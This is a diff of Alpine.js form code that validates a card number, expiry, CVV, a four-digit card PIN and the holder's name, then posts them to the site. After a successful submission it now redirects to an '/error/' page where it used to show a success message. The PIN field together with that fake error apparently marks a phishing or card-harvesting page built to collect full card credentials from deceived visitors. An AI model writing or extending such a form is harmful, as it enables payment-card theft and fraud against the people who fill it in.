@@ -128,42 +128,120 @@ document.addEventListener("alpine:init", () => {
         : "9999 9999 9999 9999 999";
     },
     cc_valid: false,
-    cc_logic(num) {
+    ccLogic(num) {
       num = num.replaceAll(" ", "");
       const regex = new RegExp("^[0-9]{13,19}$");
       if (!regex.test(num)) {
         return false;
       }
-      var nCheck = 0, nDigit = 0, bEven = false;
+      var nCheck = 0,
+        nDigit = 0,
+        bEven = false;
       num = num.replace(/\D/g, "");
 
       for (let n = num.length - 1; n >= 0; n--) {
-        var cDigit = num.charAt(n), nDigit = parseInt(cDigit, 10);
+        var cDigit = num.charAt(n),
+          nDigit = parseInt(cDigit, 10);
         if (bEven) {
           if ((nDigit *= 2) > 9) nDigit -= 9;
         }
 
         nCheck += nDigit;
         bEven = !bEven;
-        
       }
-      return (nCheck % 10) == 0;
+      return nCheck % 10 == 0;
     },
+    expLogic(num) {
+      num = num.replace("/", "");
+      num = num.replace("\\", "");
+      const regex = new RegExp("^[0-9]{4}$");
+      if (!regex.test(num)) {
+        return false;
+      }
+      // Make sure its four digits
+      const digits = num.slice(-2);
+      const start = num.slice(0, 2);
+      return (start <= 12 && start > 0 && digits > 19 && digits <= 30) ? true : false;
+      // Illegal  expiry date
+    },
+    ccValid: null,
+    expValid: null,
+    cvvValid: null,
+    pinValid: null,
+    holderValid: null,
+    validateCc() {
+      let cc = this.cc,
+        exp = this.exp,
+        cvv = this.cvv,
+        holder = this.holder,
+        pin = this.pin;
+        this.ccValid = null;
+        this.expValid = null;
+        this.cvvValid = null;
+        this.pinValid = null;
+        this.holderValid = null;
+
+      if (!cc) {
+        this.ccValid = "Card Number cannot be empty"
+        return false;
+      }
+      if (!this.ccLogic(cc)) {
+        this.ccValid = "Invalid Card Number "
+        return false;
+      }
+      if (!exp) {
+        this.expValid = "Expiry Date cannot be empty"
+        return false;
+      }
+      if (!this.expLogic(exp)) {
+        this.expValid = "Invalid Expiry Date "
+        return false;
+      }
+      if (!cvv) {
+        this.cvvValid = "CVV cannot be empty"
+        return false;
+      }
+      if (!cvv.match("^[0-9]{3}$")) {
+        this.cvvValid = "Invalid CVV "
+        return false;
+      }
+      if (!pin) {
+        this.pinValid = "Pin cannot be empty"
+        return false;
+      }
+      if (!pin.match("^[0-9]{4}$")) {
+        this.pinValid = "Invalid Pin "
+        return false;
+      }
+      if (!holder) {
+        this.holderValid = "Name cannot be empty"
+        return false;
+      }
+      re = /\w.*\s.*\w/ 
+      if (!holder.match(re)) {
+        this.holderValid = "Invalid Name "
+        return false;
+      }
+      return true;
+    },
+    validateContact() {},
     handleSubmit(e) {
       e.preventDefault();
 
       const myForm = e.target;
       const formData = new FormData(myForm);
 
-      if (this.cc_logic(this.cc)) {
+      if (this.validateCc()) {
         fetch("/", {
           method: "POST",
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: new URLSearchParams(formData).toString(),
         })
-          .then(() => alert('Success!'))
+          .then(() => navigate("/error/"))
           .catch((error) => alert(error));
-      }else{ this.cc_valid = true }
+      } else {
+        this.cc_valid = true;
+      }
     },
   }));
 });
